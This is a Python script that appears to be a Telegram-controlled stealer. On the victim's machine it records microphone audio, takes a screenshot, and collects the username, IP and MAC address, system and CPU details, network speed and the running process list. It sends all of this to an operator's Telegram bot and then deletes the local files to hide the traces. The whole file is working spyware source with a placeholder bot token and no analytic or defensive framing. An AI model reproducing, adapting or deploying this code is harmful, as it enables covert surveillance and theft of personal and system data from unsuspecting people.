# -*- coding: utf-8 -*- 
import getpass
import os
import platform
import socket
import sys
from datetime import datetime, timezone
from uuid import getnode as get_mac
import psutil
import pyautogui
from speedtest import Speedtest
import telebot
import pyaudio
import wave
from PIL import Image
from subprocess import Popen, PIPE

bot = telebot.TeleBot("token_your_bot")
process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
chunk = 1024
formats = pyaudio.paInt16
channels = 2
rate = 44100
second = 0
os.getcwd()
os.chdir(r"Direct_save ")
names = "sound.wav"
p = pyaudio.PyAudio()
stream = p.open(format=formats,
                channels=channels,
                rate=rate,
                input=True,
                frames_per_buffer=chunk)
print("")

frames = []

for i in range(0, int(rate / chunk * second)):
    data = stream.read(chunk)
    frames.append(data)

print("")

stream.stop_stream()
stream.close()
p.terminate()

wf = wave.open(names, "wb")
wf.setnchannels(channels)
wf.setsampwidth(p.get_sample_size(formats))
wf.setframerate(rate)
wf.writeframes(b''.join(frames))
wf.close()
start = datetime.now()
name = getpass.getuser()
ip = socket.gethostbyname(socket.getfqdn())
mac = get_mac()
ost = platform.uname()
inet = Speedtest()
download = float(str(inet.download())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."
                + str(round(inet.download(), 2))[1]) * 0.125
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
cpu = psutil.cpu_freq()
os.getcwd()
try:
    os.chdir(r"Direct_save ")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()
    bot.polling()
    raise SystemExit
screen = pyautogui.screenshot("screenshot.jpg")
ends = datetime.now()
workspeed = format(ends - start)
os.getcwd()
try:
    os.chdir("Direct_save ")
except OSError:
    @bot.message_handler(commands=['start'])
    def start_message(message):
        bot.send_message(message.chat.id, "[Error]: Location not found!")
        bot.stop_polling()
    bot.polling()
    raise SystemExit
file = open("info.txt", "w")
file.write(f"[================================================]\n  Operating System: {ost.system}\n  Processor: {ost.processor}\n  Username: {name}\n  IP adress: {ip}\n  MAC adress: {mac}\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\n  Work speed: {workspeed}\n  Download: {download} MB/s\n  Upload: {uploads} MB/s\n  Max Frequency: {cpu.max:.2f} Mhz\n  Min Frequency: {cpu.min:.2f} Mhz\n  Current Frequency: {cpu.current:.2f} Mhz\n[================================================]\n")
file.close()
ride = open("process.txt", "w", encoding="utf-8")
ride.write(' '.join(process))
ride.close()
text = "Screenshot"
@bot.message_handler(commands=["start"])
def start_message(message):
    upaudio = open("Direct_save\sound.wav", "rb")
    upfile = open("Direct_save\info.txt", "rb")
    uphoto = open("Direct_save\screenshot.jpg", "rb")
    upprocess = open("Direct_save\process.txt", "rb")
    bot.send_photo(message.chat.id, uphoto, text)
    bot.send_document(message.chat.id, upfile)
    bot.send_document(message.chat.id, upprocess)
    bot.send_voice(message.chat.id, upaudio)
    upfile.close()
    upprocess.close()
    uphoto.close()
    upaudio.close()

    os.remove("info.txt")
    os.remove("process.txt")
    os.remove("screenshot.jpg")
    os.remove("sound.wav")

    bot.stop_polling()


bot.polling()
